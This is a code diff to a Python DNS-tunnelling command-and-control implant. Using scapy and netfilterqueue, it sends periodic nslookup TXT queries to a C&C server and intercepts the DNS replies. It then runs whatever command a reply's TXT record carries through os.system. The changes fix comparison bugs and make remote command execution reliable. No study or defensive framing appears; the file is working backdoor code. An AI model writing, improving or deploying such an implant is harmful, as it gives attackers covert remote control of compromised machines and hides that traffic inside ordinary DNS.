@@ -5,7 +5,7 @@ import random
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
-RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890.'
+RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890'
 RAND_MIN_LEN = 7
 RAND_MAX_LEN = 15
 
@@ -21,16 +21,16 @@ def read(packet):
 
     # Read packet payload and run command if asked
     if scapy_pkt.haslayer(DNSRR):
+        print('[!] DNS reply received: src=' + str(scapy_pkt[IP].src))
         # If the packet is a DNS Resource Record (DNS reply)
         try:
             # Check if source IP is C&C server
-            if scapy_pkt[IP].src is CCIP and DNSQR in scapy_pkt:
-                # Check if packet has TXT record
-                if scapy_pky[DNS].id == 0x1337:
-                    print('[!] Found command')
-                    getcommand(scapy_pkt)
+            if str(scapy_pkt[IP].src) == CCIP:
+                # Run command found in TXT record
+                getcommand(scapy_pkt)
 
         except IndexError:
+            print('[x] Index error')
             # Not UDP packet, this can be IPerror/UDPerror packets
             pass
 
@@ -43,14 +43,16 @@ def getcommand(scapy_pkt):
     global lastcommand
 
     # Get command text
-    command = str(scapy_pkt[DNS].an.rdata)
-    print('[!] Command:', command)
+    command = str(scapy_pkt[DNS].an.rdata)[1:]
+    print('[!] Command: ' + str(command))
 
-    if command is not lastcommand:
+    if command != lastcommand:
         # Run command on system
         os.system(command)
         print('[!] Command complete')
         lastcommand = command
+    else:
+        print('[!] Repeat command')
 
 
 # Creates a random fake domain name
@@ -84,8 +86,8 @@ if __name__ == "__main__":
     while(True):
         try:
             randomname = generate_randomname()
-            os.system('nslookup ' + randomname + ' ' + CCIP)
-            print('[+] Sent DNS query:', randomname)
+            os.system('nslookup -q=txt ' + randomname + ' ' + CCIP + ' > /dev/null')
+            print('[+] Sent DNS query: ' + str(randomname))
             time.sleep(QUERY_DELAY)
         except KeyboardInterrupt:
             break
@@ -94,3 +96,4 @@ if __name__ == "__main__":
     nfqueue_process.join()
     os.system('iptables -D INPUT -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
     print('[*] iptables rule removed')
+
